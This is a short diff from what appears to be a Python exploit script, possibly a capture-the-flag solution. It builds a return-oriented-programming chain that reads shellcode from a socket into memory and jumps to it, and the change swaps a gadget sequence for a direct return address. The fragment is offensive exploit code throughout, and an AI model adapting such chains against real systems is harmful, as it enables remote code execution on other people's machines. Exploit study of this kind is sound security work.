@@ -82,11 +82,7 @@ sys_read = 0x0
 s += rop_syscall(sys_read,socketfd,addr+0x200,0x800)
 
 #jump into the shellcode
-s += popr8r9
-s += p64(addr+0x200) #r8
-s += p64(0x0) #r9
-s += xchgr8rdi
-s += callrdi
+s += p64(addr+0x200)
 
 pad = '\x41'*25
 payload = pad + s
